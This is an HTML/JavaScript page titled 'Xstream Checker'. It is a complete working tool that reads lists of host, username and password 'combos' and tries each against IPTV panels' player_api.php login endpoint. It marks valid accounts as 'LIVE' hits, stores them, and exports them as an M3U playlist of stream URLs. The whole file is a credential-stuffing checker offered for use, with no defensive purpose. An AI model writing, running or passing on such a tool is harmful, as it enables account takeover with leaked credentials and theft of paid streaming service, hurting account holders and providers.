<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Xstream Checker</title>
  <style>
    body {
      background-color: black;
      color: #00ff00;
      font-family: monospace;
      padding: 20px;
    }
    textarea, input[type="file"] {
      width: 100%;
      padding: 10px;
      background-color: #111;
      color: #0f0;
      border: 1px solid #0f0;
      margin: 10px 0;
    }
    button {
      padding: 10px;
      margin: 5px;
      background-color: #0f0;
      color: #000;
      border: none;
      cursor: pointer;
    }
    .hit {
      color: #00ff00;
    }
    .fail {
      color: #ff0000;
    }
  </style>
</head>
<body>
  <h1>Xstream Checker</h1>  <input type="file" id="fileInput" accept=".txt">
  <textarea id="comboInput" rows="10" placeholder="Paste Host:Port|Username:Password combos..."></textarea>
  <button onclick="startCheck()">Start Checking</button>
  <button onclick="exportM3U()">Export .M3U</button>
  <pre id="output"></pre>  <script>
    const output = document.getElementById('output');
    const comboInput = document.getElementById('comboInput');

    document.getElementById('fileInput').addEventListener('change', function(e) {
      const reader = new FileReader();
      reader.onload = function() {
        comboInput.value += '\n' + reader.result;
      }
      reader.readAsText(e.target.files[0]);
    });

    function log(msg, className = '') {
      const line = document.createElement('div');
      line.className = className;
      line.textContent = msg;
      output.appendChild(line);
    }

    async function checkCombo(combo) {
      try {
        const [hostport, creds] = combo.split('|');
        const [username, password] = creds.split(':');
        const url = `http://${hostport}/player_api.php?username=${username}&password=${password}`;
        const res = await fetch(url);
        const data = await res.json();

        if (data.user_info && data.user_info.auth === 1) {
          const msg = `[+] LIVE: ${combo} (${data.user_info.status})`;
          log(msg, 'hit');
          saveHit(combo);
        } else {
          log(`[-] DEAD: ${combo}`, 'fail');
        }
      } catch (e) {
        log(`[!] Error on ${combo}: ${e.message}`, 'fail');
      }
    }

    function saveHit(combo) {
      let hits = JSON.parse(localStorage.getItem('xtream_hits') || '[]');
      if (!hits.includes(combo)) {
        hits.push(combo);
        localStorage.setItem('xtream_hits', JSON.stringify(hits));
      }
    }

    function exportM3U() {
      const hits = JSON.parse(localStorage.getItem('xtream_hits') || '[]');
      const lines = hits.map(combo => {
        const [hostport, creds] = combo.split('|');
        const [user, pass] = creds.split(':');
        return `#EXTINF:-1,${hostport}\nhttp://${hostport}/get.php?username=${user}&password=${pass}&type=m3u&output=ts`;
      });
      const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'xtream_hits.m3u';
      a.click();
    }

    async function startCheck() {
      output.innerHTML = '';
      const combos = comboInput.value.trim().split('\n').filter(Boolean);
      for (const combo of combos) {
        await checkCombo(combo);
      }
    }
  </script></body>
</html>
